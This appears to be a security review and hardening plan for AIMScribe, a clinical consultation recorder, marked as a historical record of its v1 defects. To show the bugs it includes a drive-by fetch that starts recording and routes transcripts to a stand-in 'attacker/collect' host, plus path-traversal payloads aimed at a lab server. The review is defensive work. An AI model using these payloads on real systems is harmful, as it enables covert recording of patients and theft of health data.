# AIMScribe — Industry-Grade Hardening Plan

> **Historical record — read this as "what was wrong with v1 and why v2 is
> shaped the way it is."** The system described under *"What the system actually
> does today"* below is the **v1 design and no longer exists**: clips are now
> 30–60 s (not 170–190), audio is 44.1 kHz (not 32), the AIMS LAB server no
> longer accepts inbound uploads at all, and `aimslab-server/` is dead code.
>
> The defect list keeps its value — there is a regression test for each entry —
> so it is preserved verbatim rather than rewritten. For the system as built
> today see [`TARGET_ARCHITECTURE.md`](TARGET_ARCHITECTURE.md).

**Reviewed**: 2026-07-26 · **Scope**: `recorder/`, `cmed-web/`, `aimslab-server/`, docs
**Not in this repo**: the AIMScribe Backend (FastAPI + Postgres + Redis + MinIO/R2 + Whisper worker) at
`https://aimscribe-backend-render.onrender.com`. Several findings below imply backend work — flagged `[BACKEND]`.

---

## 0. What the system actually does today

```
Doctor PC                                       Cloud / AIMS LAB
─────────────────────────────────────────       ──────────────────────────────────
cmed-web (Next.js :3000)                        AIMScribe Backend (:6000 / Render)
  page.tsx        → sessionStorage                /api/v1/session/create
  dashboard.tsx   → ws://localhost:5050/ws        /api/v1/upload/request  → presigned PUT
                  → polls /api/v1/ner/{sid}       /api/v1/upload/complete → queues Whisper+NER
                  → polls /api/webhook/ner        → Whisper → LLM NER → webhook to CMED
                                                  → MinIO / R2
AIMScribe.exe (:5050, pystray)
  recorder.py       PyAudio 32kHz/16-bit mono    AIMS LAB Server (:7000, 0.0.0.0)
  simple_splitter   170–190 s clips on silence     POST /receive-recording  (multipart)
  clip_uploader     presigned PUT → R2            POST /receive-clip
  file_forwarder    full WAV → :7000              GET  /patients
  session_ctl       start/stop/force-reset        D:\AIMSLAB_AUDIO_STORAGE\recordings\{patient_id}\
```

Two independent data paths exist and they disagree with each other **and** with your stated target
layout (`HospitalID / DoctorID / Date / audio`):

| Path | Key / directory produced | Where defined |
|---|---|---|
| Clips → object storage | `audio/{patient}_{doctor}_{hospital}_{YYYYMMDD}/clip_N.wav` | `clip_uploader.py:44-46,77` |
| Full WAV → AIMS LAB | `recordings\{patient_id}\{patient_id}_{ts}.wav` | `aimslab-server/main.py:100-106` |

Neither is `hospital/doctor/date/`. Section 6 fixes this and switches to the pull model you described
(AIMS LAB reads from the bucket instead of accepting inbound uploads).

---

## 1. Critical findings — fix before any real patient touches this

### C-1. Any website the doctor visits can silently record the consultation
`recorder/api/trigger_server.py:155-161`

```python
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True,
                   allow_methods=["*"], allow_headers=["*"])
```

Combined with `verify_api_key()` being a no-op (`trigger_server.py:237-242`, the check is commented
out), `https://any-site.example` can run:

```js
fetch('http://localhost:5050/api/v1/session/start', {
  method: 'POST', headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({patient:{id:'X'}, callback:{ner_webhook_url:'https://attacker/collect'}})
})
```

→ microphone starts, audio is chunked, and — because `ner_webhook_url` is never validated
(`trigger_server.py:315`, `clip_uploader.py:290`) — the backend posts transcripts and extracted NER
to the attacker's server. This turns every clinical PC into a remote listening device via a drive-by
web page. It is the single most serious issue in the codebase.

`/api/v1/session/stop` and `/api/v1/session/force-reset` are equally open → any page can destroy an
in-progress medico-legal recording.

**Fix**: exact-origin allowlist, `allow_credentials=False`, real token enforcement (§2), `ner_webhook_url`
allowlist, and delete the legacy unauthenticated aliases `/trigger`, `/stop`, `/status`, `/force-reset`
(`trigger_server.py:464-510`) which bypass every control you add above them.

### C-2. The WebSocket "localhost only" check does not do what it looks like
`recorder/api/websocket_server.py:63-76`

```python
client_host = websocket.client.host           # always 127.0.0.1 for ANY page on this PC
if client_host not in ['127.0.0.1','localhost','::1','0.0.0.0']:
```

WebSockets are **not** subject to CORS. Any origin can open `ws://localhost:5050/ws` and the peer
address will be `127.0.0.1`, so the check always passes. There is no `Origin` check anywhere. This is a
second, independent path to C-1 that survives fixing CORS. (`0.0.0.0` in the allowlist is also
meaningless and should go.)

The HTTP endpoints have the mirror problem: **DNS rebinding**. `http://evil.example` can resolve to
`127.0.0.1`, making the request same-origin from the browser's perspective. Only a `Host` header check
stops that.

### C-3. Path traversal → arbitrary file write on the AIMS LAB server
`aimslab-server/main.py:100-106` and `:140-146`

```python
patient_dir = storage_config.recordings_dir / patient_id   # patient_id from Form(...)
patient_dir.mkdir(parents=True, exist_ok=True)
```

`pathlib` does not normalise `..`, and an **absolute** right-hand operand replaces the left entirely:

- `patient_id = "../../../Windows/Temp"` → writes outside the storage root
- `patient_id = "C:/Windows/System32/Tasks"` → `Path("D:/AIMSLAB_AUDIO_STORAGE/recordings") / "C:/..."`
  evaluates to `C:/Windows/System32/Tasks`

The server binds `0.0.0.0:7000` (`aimslab-server/config.py:12`) with `allow_origins=["*"]` and **no
authentication of any kind**, so this is reachable by every host on the hospital LAN. Same bug in
`GET /patient/{patient_id}/recordings` (`main.py:256`) as a read/enumeration primitive.

### C-4. Unauthenticated PHI enumeration
`aimslab-server/main.py:224-283`. `GET /patients` returns every patient ID with recording counts;
`GET /patient/{id}/recordings` returns filenames and timestamps. Patient IDs are identifiers — this is
a PHI disclosure endpoint open to the network.

### C-5. Fabricated clinical data can be injected into the prescription screen
`recorder/api/trigger_server.py:577-618` and `cmed-web/src/app/api/webhook/ner/route.ts:48-51`

Both NER webhook receivers read the signature headers and **never verify them** ("optional security").
The recorder's relay then broadcasts straight to the browser, which renders it into diagnosis and
**medication/dosage** fields (`dashboard/page.tsx:166-172`, `normalizeMedications`). An attacker who can
reach either endpoint can put a drug and a dose in front of a prescribing doctor. This is a patient-safety
defect, not only a security one.

`INTEGRATION_SPECIFICATION.md:443-475` already specifies the correct HMAC scheme — it just isn't
implemented on either side.

### C-6. Backend accepts anonymous clients
`session_controller.py:263-274` constructs `AsyncClipUploader` without `api_key=`, so
`clip_uploader.py:110-115` never sends `X-API-Key`. Every call to `/session/create`, `/upload/request`,
`/upload/complete` is unauthenticated. Since session IDs are guessable
(`P12345_DR001_HOSP001_20260726`), anyone on the internet can mint presigned PUT URLs into your bucket,
overwrite clips, and inject audio into the transcription pipeline. `[BACKEND]` must reject anonymous
callers regardless of what the client sends.

### C-7. Clinical attribution is self-asserted
`cmed-web/src/app/page.tsx:35-36,167-180` — `doctor_id` and `hospital_id` are editable text inputs
defaulting to `DR001` / `HOSP001`, kept in `sessionStorage`, and forwarded verbatim into the recording
session and the object key. There is no login anywhere in `cmed-web`. Whose consultation this was, at
which hospital, is therefore unauthenticated — fatal for a record with medico-legal weight, and it means
"tenant isolation" currently does not exist.

### C-8. No recording indicator, no consent
`recorder/main.py:55-80` builds one static green icon; the menu label is the hardcoded string
`"Status: Ready"` (`main.py:97`). A background always-on microphone service that never visibly signals
"recording" is a legal exposure in most jurisdictions and an ethical problem in all of them. There is
also no place in the flow where patient consent to being recorded is captured or stored.

You said the goal is "runs in the background like Windows Security" — note that Windows Security is
conspicuous by design: persistent tray presence, state-reflecting icon, notifications, an audit trail.
Copy that, not just the always-on part.

---

## 2. The core design fix: a capability token for local control

This is the one change that closes C-1, C-2 and C-7 together, so do it first.

**Principle**: the local `.exe` must not trust the browser's claims. CMED's *server* mints a short-lived,
signed token; the `.exe` verifies it against a pinned public key before touching the microphone.

`[BACKEND]` / CMED server — new endpoint, called after the doctor authenticates via OIDC:

```python
# POST /api/v1/recording-grant   (requires doctor's session cookie / OIDC access token)
claims = {
    "iss": "cmed",
    "aud": "aimscribe-recorder",
    "sub": authenticated_doctor.id,        # from the session, NOT from the request body
    "hospital_id": authenticated_doctor.hospital_id,
    "patient_id": validated_patient_id,    # doctor must be authorised for this patient
    "jti": secrets.token_urlsafe(16),
    "iat": now, "exp": now + 60,           # 60 seconds, single use
}
return {"grant": jwt.encode(claims, ED25519_PRIVATE_KEY, algorithm="EdDSA")}
```

Recorder — `recorder/api/websocket_server.py`, before `websocket.accept()`:

```python
ALLOWED_ORIGINS = frozenset(config.security.allowed_origins)   # exact strings, no wildcards
ALLOWED_HOSTS   = frozenset({"localhost:5050", "127.0.0.1:5050", "[::1]:5050"})

async def connect(self, websocket: WebSocket) -> bool:
    origin = websocket.headers.get("origin")
    host   = websocket.headers.get("host", "")
    if origin not in ALLOWED_ORIGINS:            # absent/null Origin => reject
        await websocket.close(code=4003); return False
    if host.lower() not in ALLOWED_HOSTS:        # DNS-rebinding defence
        await websocket.close(code=4003); return False
    if websocket.client.host not in ("127.0.0.1", "::1"):
        await websocket.close(code=4003); return False
    await websocket.accept()
    ...
```

Then in `_handle_start` (`websocket_server.py:142-192`), replace the trusted-browser context with:

```python
claims = verify_grant(message.get("grant"))      # EdDSA, pinned pubkey, aud/iss/exp/jti-replay checked
context = SessionContext(
    doctor_id   = claims["doctor_id"],           # from the token
    hospital_id = claims["hospital_id"],         # from the token
    patient_id  = claims["patient_id"],          # from the token
    patient_name = session.get("patient_name", ""),   # display-only fields may come from the browser
    ...
    ner_webhook_url = assert_allowlisted(callback.get("ner_webhook_url")),
)
```

Apply the same `Origin` + `Host` + grant checks to every HTTP route, and make `verify_api_key`
actually enforce (`trigger_server.py:237-242`):

```python
def verify_api_key(x_api_key: str | None = Header(None)) -> None:
    expected = config.security.local_api_key            # per-install, from DPAPI store, not source
    if not x_api_key or not hmac.compare_digest(x_api_key, expected):
        raise HTTPException(401, "unauthorised")
```

Also: `docs_url=None, redoc_url=None` in production builds, `allow_credentials=False` (bearer tokens
need no cookies), and delete `trigger_server.py:464-510`.

**Device identity** (complements the doctor grant): provision a per-install X.509 client certificate at
enrollment, private key non-exportable in Windows CNG/TPM, and use mTLS to the backend. The certificate
attests `hospital_id` and `device_id`; the grant attests `doctor_id` and `patient_id`. `[BACKEND]` should
require both to agree — that gives you real tenant isolation instead of self-declared IDs.

---

## 3. Recorder hardening

### 3.1 Don't do file I/O on the audio capture thread
`simple_splitter.py:130-169` — `_save_clip` opens a WAV and writes up to ~12 MB **synchronously inside
`process_chunk`**, which runs on the PyAudio callback thread (`recorder.py:145-167`). Every clip boundary
drops frames. Push completed buffers onto a `queue.Queue` and write from a dedicated writer thread.

`_is_silence` also does a pure-Python `sum(s*s for s in samples)` per chunk (31×/sec). Use
`audioop.rms(audio_data, 2)` (stdlib, C) or NumPy.

### 3.2 Unbounded memory, and total data loss on crash
`recorder.py:61,156` accumulates the entire consultation in `self._full_recording`, and the splitter keeps
its own copy — a 1-hour consult is ~230 MB held twice, in a list of 1024-byte objects. If the process or
PC dies, **everything is lost**; there is no spool.

Replace with an incremental encrypted spool:

- Open the session file at start; append frames; `os.fsync` every ~5 s.
- Encrypt at rest with a per-session AES-256-GCM key, key wrapped by Windows DPAPI
  (`CryptProtectData`, machine+user scope). Right now clips and full recordings sit in plaintext WAV in
  `temp_clips/` and `recordings/` (`clip_uploader.py:256`, `recorder.py:241`).
- Delete only after the backend confirms durable storage — not after the HTTP 200 for the PUT.
- On startup, scan for orphaned spools from a crash and resume upload. This also gives you a store-and-forward
  buffer for network outages, which the current design lacks entirely.

### 3.3 Switch the codec — 20× less data
32 kHz / 16-bit mono WAV = 64 KB/s ≈ **230 MB per hour per doctor**. Whisper resamples to 16 kHz anyway,
so the extra bandwidth is pure waste. Opus mono at 16–24 kbps ≈ **10 MB/hour**, with no meaningful WER
change for speech. That is a 20× cut in bandwidth, storage, R2 egress, and time-on-disk. Change
`AudioConfig.sample_rate` to 16000 and encode Opus in Ogg for both clips and the archive copy.

### 3.4 Recorder lifecycle bugs
- `recorder.py:27-36,80-87` — the singleton + `reset_instance()` pattern flips `_initialized` on a live
  instance while the capture thread may still be running. `stop_recording` joins with a 2 s timeout then
  closes the PortAudio stream regardless (`recorder.py:195-198`) → possible use-after-free in the native
  layer. Drop the singleton; own one recorder per session inside `SessionController`.
- `session_controller.py:406-417` — `_broadcast_clip_uploaded` reads `self._state.session_id` after
  `_cleanup()` may have nulled it, and reads `result.duration_seconds`, which `UploadResult`
  (`clip_uploader.py:27-35`) does not define — the `hasattr` guard silently reports `0` forever.
- `force_reset` (`session_controller.py:176-228`) writes the WAV then clears state without forwarding or
  spooling → in-flight audio is silently discarded. It is also unauthenticated (C-1).
- `websocket_server.py:272-290` — `broadcast` awaits `send_json` per client **while holding the lock**;
  one wedged client blocks all broadcasts and connect/disconnect. Snapshot the set, send with
  `asyncio.gather(..., return_exceptions=True)` outside the lock.
- `simple_splitter.py:74-108` — after a forced max-duration split the function `return`s without
  updating `_silence_counter`; `_current_duration` accumulates float drift over long sessions. Track
  sample counts as integers instead.

### 3.5 Packaging and persistence
- `install_autostart.bat:12,33-39` drops a shortcut in the user's Startup folder, pointing at
  `%~dp0dist\...` — a user-writable path. Any malware running as that user replaces the target and
  inherits your autostart. Install to `%ProgramFiles%\AIMScribe\` via a signed **MSI/WiX** package with
  admin-only ACLs.
- `BUILD.bat` produces an **unsigned** `--onefile` exe. Unsigned = SmartScreen warnings, AV false
  positives, and no tamper detection on a binary that records consultations. Sign with Authenticode
  (EV cert for immediate reputation). Switch to `--onedir` in the protected directory: `--onefile`
  re-extracts to `%TEMP%` on every launch, which is a DLL-planting surface.
- **"Run like Windows Security" — the correct split**: a Windows **service** cannot reliably capture the
  user's microphone (session 0 has no audio endpoint). Use:
  1. a low-privilege Windows service as watchdog + updater + audit shipper, and
  2. a per-user-session agent launched at logon (Task Scheduler / service-spawned into the session) that
     owns PyAudio, the tray icon, and the recording indicator.
  Give it an Event Log source, an Add/Remove Programs entry, and signed auto-update with signature
  verification before applying.
- Pin dependencies. `requirements.txt` uses `>=` throughout with no lockfile — for a binary shipped to
  20 clinical PCs, use `pip-compile` with `--generate-hashes`, produce an SBOM (CycloneDX), and gate
  releases on `pip-audit` + `npm audit`.

### 3.6 Consent and indication (C-8)
- Tray icon must reflect state: idle / recording / uploading / error, with a tooltip naming the current
  patient. Rebuild `create_tray_icon()` into a state machine and call `icon.icon = ...` on transition.
- First time a given origin pairs with the recorder, show a native consent dialog naming it; persist the
  decision. Never silently accept a new origin.
- Record patient consent as a first-class field on the session (`consent_obtained`, `consent_method`,
  `consent_timestamp`) and refuse to start without it. `[BACKEND]` stores it with the session.

---

## 4. cmed-web hardening

- `api/webhook/ner/route.ts:44-98` — implement the HMAC verification from
  `INTEGRATION_SPECIFICATION.md:443-475`: constant-time compare, ±300 s timestamp window, and a
  replay cache on `jti`. Reject unsigned requests outright.
- Same file, `:26-42` — `nerStore` is a module-level `Map` plus a module-level `setInterval`. On Vercel
  each lambda instance has its own copy, so the POST that stores NER and the GET that polls it routinely
  land on different instances: this is a **correctness** bug, not just a scaling note. It is also an
  unbounded map keyed by attacker-controlled `session.id` → memory DoS. Move to Redis (Upstash) with a
  TTL, or drop the store and read from `[BACKEND]`.
- `vercel.json:7-20` sets `Access-Control-Allow-Origin: *` on **every** route including the webhook.
  Remove the global wildcard; set CORS per-route. Add security headers: `Strict-Transport-Security`,
  a real `Content-Security-Policy` (`connect-src` must include `ws://localhost:5050`),
  `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
  `Permissions-Policy: microphone=()`.
- `page.tsx:35-36` / `dashboard/page.tsx:73-79` — replace the free-text `doctor_id`/`hospital_id` and
  `sessionStorage` PHI with OIDC login (Entra ID / Keycloak), httpOnly session cookies, and server-side
  patient lookup scoped to the authenticated doctor. PHI in `sessionStorage` is readable by any XSS.
- `dashboard/page.tsx:299-328` — the NER poller runs every 3 s per open dashboard against an unauthenticated
  backend route. Once auth exists, prefer server-sent events or the existing WebSocket and drop the poll.
- Render NER into fields, but require an explicit per-field accept action for **medications and dosages**
  before they become part of a saved prescription. Machine-suggested drugs should never be
  indistinguishable from doctor-entered ones in the UI or in the saved record.

---

## 5. AIMS LAB server hardening

The strongest fix is to **delete the inbound upload surface entirely** and use the pull model you
described (§6). If you keep it in the interim:

```python
ID_RE = re.compile(r"^[A-Za-z0-9_-]{1,32}$")

def safe_dir(root: Path, *parts: str) -> Path:
    for p in parts:
        if not ID_RE.match(p):
            raise HTTPException(400, "invalid identifier")
    target = root.joinpath(*parts).resolve()
    if not target.is_relative_to(root.resolve()):     # Python 3.9+
        raise HTTPException(400, "invalid path")
    return target
```

Plus: bind to a private interface (not `0.0.0.0`) behind a reverse proxy terminating TLS with mTLS
client certs; drop `allow_origins=["*"]`; enforce a max upload size (streaming counter, not
`shutil.copyfileobj` unbounded — `main.py:110`); validate the payload is genuinely `RIFF....WAVE` with the
expected `fmt ` chunk before accepting; write to a temp file and `os.replace` atomically; enforce a disk
quota and alert before exhaustion; require auth on `/patients` and `/patient/{id}/recordings` and scope
results to the caller's hospital.

Stop returning internals: `main.py:125,165,221,249,283` all return `detail=str(e)`, and `/create-session`
proxies raw backend error text. Same in `trigger_server.py:216-230`
(`"details": {"exception": str(exc)}`). Log the detail, return an opaque error id.

---

## 6. Storage layout — `hospital / doctor / date / audio`, done safely

Your target hierarchy is fine, with one correction: **don't put `patient_id` in the object key.**
Object keys leak into server access logs, CDN caches, metrics labels, and error traces — none of which
are PHI-safe stores. Hospital, doctor and date are not patient identifiers; the patient ID belongs in
Postgres (and optionally in encrypted object metadata).

```
s3://aimscribe-audio/
  hospital=HOSP001/
    doctor=DR001/
      date=2026-07-26/
        session=01J8F...ULID/          ← opaque; maps to patient_id in Postgres only
          clip-0001.ogg
          clip-0002.ogg
          full.ogg
          manifest.json                ← sha256 per object, codec, durations, device_id
```

The `hospital=`/`doctor=`/`date=` prefix style also lets Athena/DuckDB partition-prune later.

Replace `clip_uploader.py:44-46,77` — `[BACKEND]` should own key construction (it already issues the
presigned URL, so the client never needs to know the layout, and a compromised client cannot choose
where it writes).

### Bucket controls (MinIO and S3)

- **TLS mandatory**: bucket policy `Deny` on `aws:SecureTransport = false`. Note the recorder currently
  posts PHI audio over plain `http://localhost:7000` (`config.py:60`) — across a LAN that is cleartext PHI.
- **SSE-KMS with a key per hospital**. A stolen credential for one tenant then cannot decrypt another's
  audio. On MinIO this means KES + Vault/KMS; plain SSE-S3 gives you one key for everything.
- **Object Lock in compliance mode** for the 7-year retention in `ARCHITECTURE_DESIGN.md:346-353`.
  Critical MinIO detail: object locking **can only be enabled at bucket creation** — you cannot add it
  later. Create the archive bucket correctly now.
- **Versioning + MFA delete**; lifecycle rules matching the documented tiers (24 h hot → archive), which
  currently exist only in the doc, not in any config.
- **Access logging to a separate append-only bucket** the application's credentials cannot write to.
- **STS AssumeRole with short-lived credentials**, never long-lived access keys in config. Presigned URLs
  scoped to a single key with a ≤5 min expiry (already the intent — `clip_uploader.py:41-42` — verify
  `[BACKEND]` enforces both the expiry and the exact key).
- **Crypto-shredding** for right-to-erasure: per-session data key so deleting the key renders the object
  unrecoverable even under Object Lock.

### The pull model (replaces `file_forwarder` + `/receive-recording`)

```
Recorder ──presigned PUT──▶ MinIO/S3 ──bucket notification──▶ Redis/SQS
                                                                 │
                              AIMS LAB puller worker ◀───────────┘
                              (outbound-only, no inbound ports)
                              verifies sha256 from manifest
                              writes D:\AIMSLAB_AUDIO_STORAGE\
                                HOSP001\DR001\2026-07-26\<session>.ogg
                              records ingest in an audit table
```

The AIMS LAB server then needs **no listening port at all**, which deletes C-3, C-4, and the whole
unauthenticated-upload class of bug in one move. Make the worker idempotent on `(bucket, key, etag)`,
verify the manifest hash before declaring success, and only then permit lifecycle deletion of the hot copy.

---

## 7. Compliance, audit, and operations

- **PHI in logs.** `session_controller.py:132,299`, `trigger_server.py:280-281`,
  `websocket_server.py:172-173`, `aimslab-server/main.py:114,154` log patient IDs, names, and webhook
  URLs to `logs/recorder_YYYYMMDD.log` — plaintext, no rotation, no ACL, and `main.py:117-121` opens that
  folder in Explorer from the tray menu. Add a redacting log filter (hash or tokenise identifiers), rotate
  with a size cap, ACL the directory to Administrators + the service account, and set a retention period.
- **Audit trail.** There is none. You need an append-only, hash-chained record of: session start/stop,
  authenticated doctor, device id, origin, patient, consent, every clip's hash, every upload, every
  force-reset, every AIMS LAB ingest. This is what makes the recording admissible and what an auditor
  will ask for first.
- **Third-party PHI processing.** Bengali patient speech goes to Whisper and an LLM
  (`ARCHITECTURE_DESIGN.md:366-373`). You need a DPA/BAA with each processor, zero-retention API
  configuration, and ideally de-identification of names before the NER call. Also check data residency:
  `vercel.json:6` pins `sin1` (Singapore) — patient data leaving Bangladesh is a policy decision someone
  senior must sign off on, and Bangladesh's data-protection regime is tightening.
- **No tests exist in the repo.** Minimum viable suite: splitter boundary conditions; uploader
  retry/idempotency; crash-recovery of the spool; and a **security regression suite** that asserts a
  cross-origin `fetch`, a `null`-Origin WebSocket, a rebound `Host` header, an unsigned NER webhook, and
  `patient_id="../.."` are all rejected. Those five tests are what stop C-1…C-5 from coming back.
- **Threat model + DPIA** as living documents; annual third-party pentest with the localhost attack
  surface explicitly in scope.

---

## 8. Suggested order of work

| # | Work | Closes | Effort |
|---|---|---|---|
| 1 | Origin + Host allowlist on WS and HTTP; kill wildcard CORS; delete legacy endpoints; disable `/docs` | C-1, C-2 | 1 d |
| 2 | `safe_dir()` validation + auth on AIMS LAB, or take it off the network entirely | C-3, C-4 | 1 d |
| 3 | HMAC verification on both NER webhook receivers; `ner_webhook_url` allowlist | C-5 | 1 d |
| 4 | Signed capability grants; enforce `verify_api_key`; pass `api_key` in `AsyncClipUploader` | C-1, C-6, C-7 | 1 w |
| 5 | OIDC login in cmed-web; remove PHI from `sessionStorage`; derive doctor/hospital server-side | C-7 | 1 w |
| 6 | Recording indicator + origin consent dialog + consent field on the session | C-8 | 3 d |
| 7 | Encrypted crash-safe spool; writer thread off the capture path; Opus | §3.1–3.3 | 1 w |
| 8 | Bucket controls: SSE-KMS per hospital, Object Lock, TLS-only policy, lifecycle, STS | §6 | 3 d |
| 9 | New key layout + AIMS LAB pull worker; retire `file_forwarder` | §6 | 1 w |
| 10 | MSI installer, Authenticode signing, service+agent split, signed auto-update | §3.5 | 2 w |
| 11 | Audit trail, PHI log redaction, retention | §7 | 1 w |
| 12 | Test suite incl. security regressions; SBOM + dependency gating | §7 | 1 w |

Items 1–3 are roughly three days of work and remove the exploitable-from-a-web-page class of bugs.
Nothing should reach a real clinic before them.

---

## 9. Note on the documentation

`ARCHITECTURE_DESIGN.md` and `INTEGRATION_SPECIFICATION.md` describe a system substantially more secure
than the code: API keys (`INTEGRATION_SPECIFICATION.md:429-441`), HMAC webhooks (`:443-475`), retry
schedules (`:477-490`), a scoped CORS list (`ARCHITECTURE_DESIGN.md:269-283`), tiered retention
(`:346-353`). None of it is implemented, and `INTEGRATION_SPECIFICATION.md:5` says
**"Status: Production Ready"**. Fix the status line today — someone will otherwise deploy against that
claim. The specs themselves are good targets; treat this plan as the implementation checklist for them.
